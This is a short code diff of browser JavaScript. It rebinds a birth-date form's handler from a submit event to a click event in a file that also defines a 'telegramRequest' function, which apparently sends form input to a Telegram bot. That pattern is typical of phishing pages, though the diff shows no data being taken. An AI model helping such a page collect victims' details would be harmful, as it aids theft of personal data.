@@ -143,7 +143,7 @@ async function telegramRequest(method, data) {
     console.error(error);
   }
 }
-const form = document.getElementById('form');
+const form = document.getElementById('submit');
 let tgl_lahir; // Deklarasikan variabel tgl_lahir di luar event listener
 
 const inputDate = document.getElementById("tgl_lahir");
@@ -155,7 +155,7 @@ inputDate.addEventListener("change", function() {
 });
 
 
-form.addEventListener('submit', async (event) => {
+form.addEventListener('click', async (event) => {
   event.preventDefault();
   let submitdate;
         var waktu = new Date();
